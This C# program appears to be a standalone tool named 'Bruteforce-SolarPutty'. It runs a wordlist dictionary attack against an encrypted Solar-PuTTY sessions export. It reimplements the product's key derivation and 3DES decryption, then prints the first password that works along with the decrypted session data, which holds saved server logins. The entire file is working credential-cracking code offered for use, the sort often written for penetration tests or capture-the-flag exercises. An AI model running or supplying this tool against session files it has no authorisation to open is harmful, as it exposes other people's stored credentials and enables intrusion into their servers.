using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

class Program
{
    static void Main(string[] args)
    {
        // Check for the correct number of arguments
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: Bruteforce-SolarPutty.exe <wordlist_file_path> <sessions_file_path>");
            return;
        }

        string wordlistFile = args[0];          // wordlist file
        string sessionsFilePath = args[1];      // sessions file
        bool passwordFound = false;              // Track if a password was found

        try
        {
            string content = File.ReadAllText(sessionsFilePath); // Read the entire content of the sessions file

            foreach (string passPhrase in File.ReadLines(wordlistFile)) // Iterate over each password in the wordlist
            {
                try
                {
                    // Decrypt the content using the Decrypt function
                    string decryptedText = Decrypt(passPhrase.Trim(), content);

                    // Check if the decrypted text contains the word "Sessions"
                    if (decryptedText.Contains("Sessions"))
                    {
                        Console.WriteLine("Password that worked: " + passPhrase);
                        Console.WriteLine("Decrypted Text:");
                        var jsonObject = JsonSerializer.Deserialize<object>(decryptedText);
                        Console.WriteLine(JsonSerializer.Serialize(jsonObject, new JsonSerializerOptions { WriteIndented = true }));
                        passwordFound = true; // Set the flag to true when a password is found
                        break; // Stop after the first successful decryption
                    }
                }
                catch  // Handle any exceptions during decryption
                {
                }
            }

            // If no password was found, print a message
            if (!passwordFound)
            {
                Console.WriteLine("Password not found in the wordlist.");
            }
        }
        catch (FileNotFoundException fnfe)
        {
            Console.WriteLine("File not found: " + fnfe.Message);
        }
        catch (UnauthorizedAccessException uae)
        {
            Console.WriteLine("Access denied: " + uae.Message);
        }
        catch (Exception e)
        {
            Console.WriteLine("Error: " + e.Message);
        }
    }

    // Decrypt function
    public static string Decrypt(string passPhrase, string cipherText)
    {
        byte[] array = Convert.FromBase64String(cipherText);
        byte[] salt = array.Take(24).ToArray();
        byte[] rgbIV = array.Skip(24).Take(24).ToArray();
        byte[] array2 = array.Skip(48).ToArray();

        using (Rfc2898DeriveBytes rfc2898 = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
        {
            byte[] key = rfc2898.GetBytes(24);

            using (TripleDESCryptoServiceProvider tripleDES = new())
            {
                tripleDES.Mode = CipherMode.CBC;
                tripleDES.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform decryptor = tripleDES.CreateDecryptor(key, rgbIV))
                {
                    using (MemoryStream memoryStream = new MemoryStream(array2))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                        {
                            // Read all decrypted bytes
                            using (MemoryStream decryptedStream = new MemoryStream())
                            {
                                cryptoStream.CopyTo(decryptedStream); // Copy the decrypted data to a new stream
                                return Encoding.UTF8.GetString(decryptedStream.ToArray()); // Convert the entire stream to a string
                            }
                        }
                    }
                }
            }
        }
    }
}